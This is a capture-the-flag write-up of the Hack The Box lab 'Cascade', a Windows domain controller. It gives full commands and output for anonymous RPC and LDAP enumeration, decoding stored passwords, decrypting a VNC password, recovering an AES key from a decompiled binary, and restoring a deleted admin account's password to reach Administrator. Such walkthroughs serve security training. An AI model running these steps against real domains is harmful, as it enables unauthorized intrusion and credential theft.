---
layaout: post
image: /assets/images/cascade.png
title: Cascade Write Up HTB
date: 30-01-2025
categories: [Write ups]
tag: [Active Directory, DnSpy]
excerpt: "Cascade is a medium difficulty Windows machine acting as a Domain Controller. Through enumeration and exploiting certain Active Directory features, we discover a series of credentials leading to escalating privileges. The key to success lies in leveraging the AD Recycle Bin to retrieve valuable information and ultimately gain access to the domain administrator account"
---

![img-description](/assets/images/cascade.png)

**Cascade** is a medium difficulty Windows machine acting as a Domain Controller. Through enumeration and exploiting certain Active Directory features, we discover a series of credentials leading to escalating privileges. The key to success lies in leveraging the **AD Recycle Bin** to retrieve valuable information and ultimately gain access to the domain administrator account.


# ENUMERATION

---

## Nmap scanning

---

````bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.182 -sCV -vvv

Host is up, received user-set (0.16s latency).
Scanned at 2025-01-29 17:22:25 CET for 149s
Not shown: 65520 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-29 16:23:24Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-29T16:24:16
|_  start_date: 2025-01-29T16:17:35
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 51409/tcp): CLEAN (Timeout)
|   Check 2 (port 11405/tcp): CLEAN (Timeout)
|   Check 3 (port 10882/udp): CLEAN (Timeout)
|   Check 4 (port 30219/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: -1s
````

The Nmap scan provided several interesting insights, such as the fact that the server is running **Windows Server 2008**, which is significantly outdated. Additionally, port **5985** is open. Considering that we are working on a CTF, this strongly suggests that we may find valid credentials to log in through this service.

## Enumerating SMB as anonymous
---

As always, we start by enumerating SMB to check for potential access as **anonymous** or **guest**. Unfortunately, we did not find anything interesting.

````bash
❯ crackmapexec smb 10.10.10.182 -u '' -p ''
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\: 
❯ crackmapexec smb 10.10.10.182 -u 'guest' -p 'guest'
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\guest:guest STATUS_LOGON_FAILURE 
````

## Enumerating RPC
---

We also noticed that the RPC port is open, so we will attempt to enumerate it as well. As we observed in the previous machine we worked on, "Resolute," this service can reveal important information.

````bash
❯ rpcclient -U "guest" -N 10.10.10.182
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
❯ rpcclient -U '' -N 10.10.10.182
rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
````

In the previous machine, using the `querydispinfo` command, we also found credentials. At the very least, we managed to retrieve usernames and their correct format. We will copy these usernames into a file and use the following command to apply the correct format maybe it could be usefull later for trying password sprying you may never know.

````bash
❯ grep -oP '(?<=user:\[)[^\]]+' raw_names.txt > users.txt
❯ cat users.txt
File: users.txt
───────┼──────────────────────────────────────────────────────────────────────────────────
   1   │ CascGuest
   2   │ arksvc
   3   │ s.smith
   4   │ r.thompson
   5   │ util
   6   │ j.wakefield
   7   │ s.hickson
   8   │ j.goodhand
   9   │ a.turnbull
  10   │ e.crowe
  11   │ b.hanson
  12   │ d.burman
  13   │ BackupSvc
  14   │ j.allen
  15   │ i.croft
````

## Enumerating LDAP
---

According to our methodology, the next step is to enumerate LDAP. To do this, we first need to obtain the naming contexts using the following command.

````bash
❯ ldapsearch -x -H ldap://10.10.10.182 -s base -b "" namingcontexts
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local
````

Now that we know the namingContexts: `DC=cascade,DC=local`, we can safely enumerate LDAP in search of relevant information.

````bash
❯ ldapsearch -x -H ldap://10.10.10.182 -b 'DC=cascade,DC=local' -s sub > ldap_dump.txt
````
The problem with this command is that it dumps all the information, making it difficult to focus on what's important. Therefore, we can be more specific about what we want to dump. In this case, using the filter `(objectClass=person)`, we found relevant information. However, here is a link to a <a href="https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7" target="_blank">cheatsheet</a> where you can find more filters.


````bash
❯ ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" "(objectClass=person)" > dumping_users.txt
````
After a while of reviewing the users, we found potential base64-encoded credentials for the user **Ryan**.

````bash
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
````

# FOOTHOLD 
---

````bash
cascadeLegacyPwd: clk0bjVldmE=

❯ echo 'clk0bjVldmE=' | base64 -d
rY4n5eva#  
````

As we noticed before the port x was open so we tryed to log in but it didnt work

````powershell
❯ nxc winrm 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva'
WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\r.thompson:rY4n5eva
````

Now, with the credentials of r.thompson, we can successfully enumerate the SMB.

````powershell
❯ crackmapexec smb 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva' --shares

SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$                          
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share 
````

We logged in with smbclient, and now that we are inside, let me give you a pro tip for enumerating everything at once, without having to go through each folder manually, as it can be very tedious:

````powershell
❯ smbclient //10.10.10.182/Data -U r.thompson

Password for [WORKGROUP\r.thompson]:
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (16.2 KiloBytes/sec) (average 16.2 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (8.0 KiloBytes/sec) (average 12.0 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (38.3 KiloBytes/sec) (average 20.7 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (16.8 KiloBytes/sec) (average 19.7 KiloBytes/sec)
````

**Explanation:**

- `mask ""`: This command removes any filters that might limit the file enumeration, ensuring that we see all files.
- `recurse ON`: This enables recursive searching, meaning it will search through all subdirectories of the current folder.
- `prompt OFF`: This disables the prompt asking for confirmation before downloading each file, making the process automatic.
- `mget *`: This command downloads all files from the shared folder to the local machine.

By using these commands together, we can quickly enumerate and download all files from the shared folder without having to navigate manually through each subfolder. This approach speeds up the process significantly.

Upon reviewing the downloaded files, we found an email containing valuable information that we will likely use later, as well as a file containing credentials that appear to be in hexadecimal format

![Usersweb](/assets/cascade/email.png)

![Usersweb](/assets/cascade/vnc.png)

While searching online for methods to decrypt VNC passwords, we found a one-liner that works correctly

````bash
❯ echo -n '6bcf2a4b6e5aca0f' | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
````
## Connecting into WINRM as s.smith
---

Confirming that we are able to log in on winrm

````bash
nxc winrm 10.10.10.182 -u 's.smith' -p 'sT333ve2'
WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
````

````powershell
❯ evil-winrm -i 10.10.10.182 -u s.smith -p 'sT333ve2'

*Evil-WinRM* PS C:\Users\s.smith\Desktop> ls


    Directory: C:\Users\s.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/29/2025   6:08 PM             34 user.txt
-a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk
````

# PRIVILEGE ESCALATION
---

While enumerating the groups of the new user, I noticed that they belong to **Audit Share**, which we had previously enumerated with **crackmapexec**.

````powershell
*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami -groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Audit Share                         Alias            S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
````

We go to **smbclient** and dump all the content again.

````bash
❯ smbclient //10.10.10.182/Audit$ -U s.smith
Password for [WORKGROUP\s.smith]:
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
getting file \CascAudit.exe of size 13312 as CascAudit.exe (67.4 KiloBytes/sec) (average 67.4 KiloBytes/sec)
getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (76.9 KiloBytes/sec) (average 71.6 KiloBytes/sec)
getting file \RunAudit.bat of size 45 as RunAudit.bat (0.3 KiloBytes/sec) (average 49.7 KiloBytes/sec)
getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (1017.2 KiloBytes/sec) (average 445.5 KiloBytes/sec)
getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (903.5 KiloBytes/sec) (average 533.2 KiloBytes/sec)
getting file \DB\Audit.db of size 24576 as DB/Audit.db (150.9 KiloBytes/sec) (average 483.1 KiloBytes/sec)
getting file \x64\SQLite.Interop.dll of size 1639936 as x64/SQLite.Interop.dll (2074.5 KiloBytes/sec) (average 1101.7 KiloBytes/sec)
getting file \x86\SQLite.Interop.dll of size 1246720 as x86/SQLite.Interop.dll (1612.6 KiloBytes/sec) (average 1242.4 KiloBytes/sec)
````

Among everything we found, there is a database and some Base64-encoded credentials.

````bash
 Audit.db
❯ sqlite3 Audit.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
DeletedUserAudit  Ldap              Misc            
sqlite> select * from Misc;
sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
sqlite> select * from DeletedUserAudit;
6|test|Test
DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
7|deleted|deleted guy
DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
sqlite> 
````

I tryed to decode the credentials but it does not works

````bash
❯ echo 'BQO5l5Kj9MdErXx6Q6AGOw=='|base64 -d
������D�|zC�;#
````

So we have no choice but to transfer the binaries we found in the last SMB share to our Windows and use the **DNSpy** program to decompile them and see if we find anything.

To be honest, this part of the machine seemed like Brainfuck to me and I had to ask a friend for help.

![Usersweb](/assets/cascade/dnspy1.png)

![Usersweb](/assets/cascade/dnsp2.png)

By examining the code, we can see that it encrypts the password (stored in the database we also downloaded) using AES in CBC mode with the key "c4scadek3y654321.""1tdyjCbY1Ix49842" We'll use CyberChef to input the key and try to decrypt the credentials.

![Usersweb](/assets/cascade/cyberchef.png)

## Log in on WinRM as arksvc
---
Usaremos las credenciales encontradas para entrar al nuevo usuario y ver que clase de permisos tenemos

````powershell
❯ evil-winrm -i 10.10.10.182 -u arksvc -p 'w3lc0meFr31nd'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\arksvc\Documents> 
````

Enumerating for a while as `arksvc`, we discover that we are part of the **AD Recycle Bin** group.

 **What is AD Recycle Bin in Active Directory?**

The **AD Recycle Bin** is a feature in Active Directory that allows the recovery of deleted objects, such as users, groups, or computers, without requiring backups. Being part of this group, we can potentially enumerate and extract information from deleted objects in the domain.

````powershell
*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami -all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
````

Upon discovering that we are part of the **AD Recycle Bin** group, we recalled that during our previous SMB enumeration, we found logs related to the deletion of a temporary administrator account.

If we manage to restore this account from the Recycle Bin, it is highly likely that we will obtain valid **Administrator** credentials. This assumption is further reinforced by an email we found earlier, which stated that the **Administrator** and **Temp Admin** accounts share the same password

````bash
❯ cat ArkAdRecycleBin.log
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: ArkAdRecycleBin.log
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
   2   │ 1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
   3   │ 1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
   4   │ 1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
   5   │ 2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
   6   │ 2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
   7   │ 2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
   8   │ 2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
   9   │ 2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
  10   │ 2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0   
  11   │ 8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
  12   │ 8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
  13   │ 8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
  14   │ 8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
  15   │ 8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
  16   │ 8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
````

So, we will leverage our **AD Recycle Bin** privileges to retrieve information about the **Temp Admin** account.

````powershell
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(ObjectClass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
````

# LOG IN AS ADMINISTRATOR 
---

We found the credentials encoded in **Base64**, so we simply decoded them and finally became **Administrator**.

This machine has been quite tedious, especially having to extract the binaries to Windows and decompile them with **dnSpy**, but at least we have learned a lot in the process
````bash
❯ echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
baCT3r1aN00dles#  
````

````powershell
❯ evil-winrm -i 10.10.10.182 -u administrator -p 'baCT3r1aN00dles'
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/29/2025   6:08 PM             34 root.txt
````
![netrunner](/assets/images/netrunner.gif)